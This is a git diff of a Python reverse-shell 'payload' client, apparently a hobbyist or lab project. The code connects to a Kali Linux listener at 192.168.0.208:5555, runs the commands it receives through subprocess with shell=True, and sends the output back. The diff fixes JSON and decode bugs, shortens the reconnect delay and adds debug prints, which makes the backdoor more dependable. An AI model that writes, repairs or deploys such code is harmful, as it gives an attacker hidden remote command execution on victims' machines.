@@ -16,8 +16,10 @@ def reliable_recv():
     while True:
         try:
             #get 1024 bites from serrver
+            print("data received")
             data = data + s.recv(1024).decode().rstrip() #decode data
-            return json.load(data)
+            print("returning Data")
+            return json.loads(data)
         except ValueError:
             continue 
 pass
@@ -26,7 +28,7 @@ pass
 #try to connect to kali linux machine
 def connection():
     while True: 
-        time.sleep(20)
+        time.sleep(5)
         try:
             s.connect(("192.168.0.208",5555))
             shell()
@@ -45,7 +47,8 @@ def shell():
         else:
             execute= subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read() #gives output of cmd
-            result= result.decode
+            result= result.decode()
+            print(result)
             reliable_send(result)
 
 #first establish a connection between Payload and Server.
